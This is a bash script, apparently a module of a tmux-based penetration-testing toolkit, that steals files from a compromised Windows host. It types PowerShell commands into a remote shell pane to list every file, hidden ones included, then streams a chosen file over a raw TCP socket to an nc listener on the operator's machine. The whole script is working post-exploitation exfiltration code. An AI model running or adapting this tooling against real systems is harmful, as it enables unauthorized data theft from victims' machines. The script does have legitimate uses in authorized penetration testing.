#!/usr/bin/env bash

_CMD_CURRENT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
_PENMUX_SCRIPTS=""
_MODULE_PATH=""

_windows_path_to_unix() {
  local path="$1"
  path="$(echo "$path" | sed 's/\\/\//g' | sed 's/://g')"

  echo "$path"
}

_fetch_file() {
  local pane_id="$1"
  local src="$2"
  local dst="$3"
  local lhost="$4"
  local lport="$5"
  local dst_dir="$(dirname "$dst")"
  local nc_window

  if [[ ! -d "$dst_dir" ]]; then
    mkdir -p "$dst_dir" || return
  fi

  nc_window="$(tmux new-window -P -d "nc -nlvp \"$lport\" > \"$dst\"")"

  tmux send-keys -t "$pane_id" "\$FileName = \"$src\"" Enter
  tmux send-keys -t "$pane_id" '[byte[]]$buffer = New-Object byte[] 1024' Enter
  tmux send-keys -t "$pane_id" '$FileStream = [System.IO.File]::OpenRead($FileName)' Enter
  tmux send-keys -t "$pane_id" "\$TcpClient = New-Object System.Net.Sockets.TcpClient(\"$lhost\", \"$lport\")" Enter
  tmux send-keys -t "$pane_id" '$Stream = $TcpClient.GetStream()' Enter
  tmux send-keys -t "$pane_id" 'while ( $bytes = $FileStream.Read($buffer,0,$buffer.count)) { $Stream.Write($buffer,0,$bytes) }' Enter
  tmux send-keys -t "$pane_id" '$FileStream.Close()' Enter
  tmux send-keys -t "$pane_id" '$Stream.Dispose()' Enter
  tmux send-keys -t "$pane_id" '$TcpClient.Dispose()' Enter

  while true; do
    tmux has-session -t "$nc_window" >/dev/null 2>&1 || break
    sleep 1
    tmux has-session -t "$nc_window" >/dev/null 2>&1 || break
    sleep 5
    local user_select="$(tmux command-prompt -p "If you got an error in PS perhaps you need to close the listener. Kill Listener? (y/n)" -1 "display-message -p '%%'")"
    if [[ "$user_select" == "y" ]]; then
      tmux kill-window -t "$nc_window"
      rm "$dst"
      break
    fi
  done
}

_fetch_file_list() {
  local pane_id="$1"
  local lhost="$(penmux_module_get_option "$_MODULE_PATH" "LocalHost" "$pane_id")"
  local lport="$(penmux_module_get_option "$_MODULE_PATH" "LocalTempPort" "$pane_id")"
  local files="$(mktemp)"

  tmux send-keys -t "$pane_id" 'Get-ChildItem -File -recurse | Select Name -ExpandProperty FullName > $env:TEMP\fl.txt' Enter
  tmux send-keys -t "$pane_id" 'Get-ChildItem -Hidden -File -recurse | Select Name -ExpandProperty FullName >> $env:TEMP\fl.txt' Enter

  _fetch_file "$pane_id" '$env:TEMP\fl.txt' "$files" "$lhost" "$lport"

  dos2unix "$files" > /dev/null

  echo "$files"
}

_list_files() {
  local pane_id="$1"
  local files="$2"

  tmux set-option -t "$pane_id" -p "@penmux-commander-pfs-hidden-file" "$(cat "$files" | fzf --cycle --border="sharp")"
  rm "$files"
}

_run() {
  local pane_id="$1"
  local lhost="$(penmux_module_get_option "$_MODULE_PATH" "LocalHost" "$pane_id")"
  local lport="$(penmux_module_get_option "$_MODULE_PATH" "LocalTempPort" "$pane_id")"
  local files="$(_fetch_file_list "$pane_id")"
  [[ -e "$files" ]] || return

  tmux display-popup -w 80% -h 80% -E "$_CMD_CURRENT_DIR/powershell_fetch_socket.sh -a list_files -c \"$_PENMUX_SCRIPTS\" -m \"$_MODULE_PATH\" -p \"$pane_id\" -f \"$files\""
  local file_to_fetch="$(tmux show-options -t "$pane_id" -pqv "@penmux-commander-pfs-hidden-file")"
  tmux set-option -pu "@penmux-commander-pfs-hidden-file"

  if [[ -z "$file_to_fetch" ]]; then
    file_to_fetch="$(tmux command-prompt -p "Enter file to fetch: " "display-message -p '%%'")"
  fi

  [[ -z "$file_to_fetch" ]] && return

  local dst_file="$(_windows_path_to_unix "${file_to_fetch}")"
  dst_file="###SessionDir###Files/${dst_file}"
  dst_file="$(penmux_module_expand_options_string "$_MODULE_PATH" "$dst_file" "$pane_id")"
  dst_file="$(penmux_expand_tmux_format_path "$pane_id" "$dst_file")"

  _fetch_file "$pane_id" "$file_to_fetch" "$dst_file" "$lhost" "$lport"
}

main() {
  local action
  local pane_id
  local files

  pane_id="$(tmux display-message -p "#D")"

  local OPTIND o
  while getopts "a:c:m:p:f:" o; do
    case "${o}" in
      a)
        action="${OPTARG}"
        ;;
      c)
        _PENMUX_SCRIPTS="${OPTARG}"
        ;;
      m)
        _MODULE_PATH="${OPTARG}"
        ;;
      p)
        pane_id="${OPTARG}"
        ;;
      f)
        files="${OPTARG}"
        ;;
      *)
        echo >&2 "Invalid parameter"
        exit 1
        ;;
    esac
  done

  source "$_PENMUX_SCRIPTS/inc.sh"

  # if supported_tmux_version_ok; then
  case "${action}" in
    "run")
      _run "$pane_id"
      exit 0
      ;;
    "list_files")
      _list_files "$pane_id" "$files"
      exit 0
      ;;
    *)
      tmux display-message -d 5000 "Error: 'Invalid action ${action}'"
      exit 0
      ;;
  esac
  # fi
}
main "$@"
